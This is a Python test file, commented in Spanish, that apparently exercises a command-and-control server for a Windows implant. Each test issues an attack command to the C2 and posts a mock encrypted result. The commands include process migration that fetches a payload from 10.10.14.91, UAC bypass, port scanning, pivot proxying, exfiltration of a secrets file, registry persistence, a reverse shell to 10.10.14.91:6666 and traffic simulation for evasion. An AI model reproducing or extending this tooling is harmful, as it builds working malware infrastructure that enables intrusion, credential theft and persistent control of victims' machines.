# test_commands.py
import pytest
import base64
import requests
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from config import C2_URL,C2_USER , C2_PASS, MALEABLE, CLIENT_ID, encrypt_data, decrypt_data, TEST_LATENCY_TIME



# Deshabilitar advertencias SSL (por certificados auto-firmados)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BASE_URL = C2_URL.rstrip("/")
COMMAND_ENDPOINT = f"{BASE_URL}{MALEABLE}{CLIENT_ID}"
RESULT_ENDPOINT = f"{BASE_URL}{MALEABLE}{CLIENT_ID}"
ISSUE_COMMAND_URL = f"{BASE_URL}/issue_command"

# Datos simulados que el implant enviaría
MOCK_RESULT = {
    "output": "Command executed successfully",
    "command": "whoami",
    "client": "windows",
    "pid": 1234,
    "hostname": "DESKTOP-ABC123",
    "ips": "192.168.1.100",
    "user": "user\\test",
    "discovered_ips": "192.168.1.1,192.168.1.2",
    "result_portscan": "80:open,443:open",
    "result_pwd": "C:\\Users\\test",
}

# -----------------------------
# HELPERS
# -----------------------------
def send_command_via_web(command: str):
    """Simula enviar un comando vía interfaz web /issue_command con autenticación básica"""
    data = {"client_id": CLIENT_ID, "command": command}
    # Añade el parámetro 'auth' con las credenciales
    r = requests.post(ISSUE_COMMAND_URL, data=data, auth=(C2_USER, C2_PASS), verify=False)
    
    # Imprime el código de estado si es necesario para depurar
    print(f"URL: {ISSUE_COMMAND_URL}, Status Code: {r.status_code}")
    
    time.sleep(TEST_LATENCY_TIME)
    
    # Asegúrate de que el código de estado sea 200 (OK)
    assert r.status_code == 200

def get_encrypted_command() -> str:
    """Obtiene el comando cifrado del endpoint GET"""
    r = requests.get(COMMAND_ENDPOINT, verify=False)
    assert r.status_code == 200
    time.sleep(TEST_LATENCY_TIME)
    return r.text  # Base64-encoded IV + CFB ciphertext

def post_result(result_data: dict):
    """Envía el resultado cifrado al C2"""
    plaintext = json.dumps(result_data)
    encrypted = encrypt_data(plaintext.encode())
    time.sleep(TEST_LATENCY_TIME)
    r = requests.post(RESULT_ENDPOINT, data=encrypted, verify=False, headers={"Content-Type": "application/octet-stream"})
    assert r.status_code == 200
    assert r.json().get("status") == "success"

# -----------------------------
# TESTS POR COMANDO
# -----------------------------

def test_migrate():
    send_command_via_web("migrate:explorer.exe,http://10.10.14.91/payload.exe")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "migrate:explorer.exe,http://10.10.14.91/payload.exe"
    result["output"] = "Migration to explorer.exe successful"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_uac_bypass():
    send_command_via_web("uac_bypass:C:\\Temp\\payload.exe")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "uac_bypass:C:\\Temp\\payload.exe"
    result["output"] = "UAC bypass attempted successfully"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_portscan():
    send_command_via_web("portscan:192.168.1.1")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "portscan:192.168.1.1"
    result["output"] = "22:closed,80:open,443:open"
    result["result_portscan"] = "80:open,443:open"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_discover():
    send_command_via_web("discover:")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "discover:"
    result["output"] = "Discovered hosts: 192.168.1.1, 192.168.1.2"
    result["discovered_ips"] = "192.168.1.1,192.168.1.2"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_proxy():
    send_command_via_web("proxy:start:127.0.0.1:9090:10.0.0.5:80")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "proxy:start:127.0.0.1:9090:10.0.0.5:80"
    result["output"] = "[*] Proxy started on 127.0.0.1:9090 -> 10.0.0.5:80"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

    # Stop
    send_command_via_web("proxy:stop:127.0.0.1:9090")
    time.sleep(1)
    result["command"] = "proxy:stop:127.0.0.1:9090"
    result["output"] = "[*] Proxy stopped on 127.0.0.1:9090"
    post_result(result)

def test_download():
    # Simula que el C2 pide descargar un archivo
    files = {'file': ('payload.exe', open('payload.exe', 'rb'), 'application/octet-stream')}
    r = requests.post(f"{C2_URL}{MALEABLE}download_file", files=files, data={'client_id': CLIENT_ID}, verify=False)
    assert r.status_code == 200

    # El implant debería recibir: download:payload.exe
    time.sleep(2)
    encrypted_cmd = get_encrypted_command()
    if encrypted_cmd:
        cmd = decrypt_data(encrypted_cmd)
        assert "download:payload.exe" in cmd

    # Simulamos que el implant responde
    result = MOCK_RESULT.copy()
    result["command"] = "download:payload.exe"
    result["output"] = "[+] Downloaded payload.exe"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_upload():
    send_command_via_web("upload:C:\\Temp\\secrets.txt")
    time.sleep(2)

    # Aquí el implant sube un archivo cifrado
    file_data = b"username=admin\npassword=123456"
    encrypted_upload = encrypt_data(file_data)

    # El C2 espera en /command/<id> un POST con JSON
    result = MOCK_RESULT.copy()
    result["command"] = "upload:C:\\Temp\\secrets.txt"
    result["output"] = "Uploaded: secrets.txt"
    result["data"] = base64.b64encode(file_data).decode()  # O el implant lo envía directo cifrado
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)


def test_persistence():
    send_command_via_web("persist:")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "persistence"
    result["output"] = "[+] Persistence established via registry"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_softenum():
    send_command_via_web("softenum:")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "softenum:"
    result["output"] = "Useful software: git.exe, python.exe, nmap.exe"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_simulate():
    send_command_via_web("simulate:")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "simulate:"
    result["output"] = "Simulated legitimate traffic started"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_reverse_shell():
    send_command_via_web("rev:10.10.14.91:6666")
    time.sleep(2)
    result = MOCK_RESULT.copy()
    result["command"] = "rev:10.10.14.91:6666"
    result["output"] = "[*] Reverse shell connected"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)

def test_shutdown():
    send_command_via_web("terminate:")
    time.sleep(1)
    result = MOCK_RESULT.copy()
    result["command"] = "terminate:"
    result["output"] = "[*] System shutdown initiated"
    time.sleep(TEST_LATENCY_TIME)
    post_result(result)
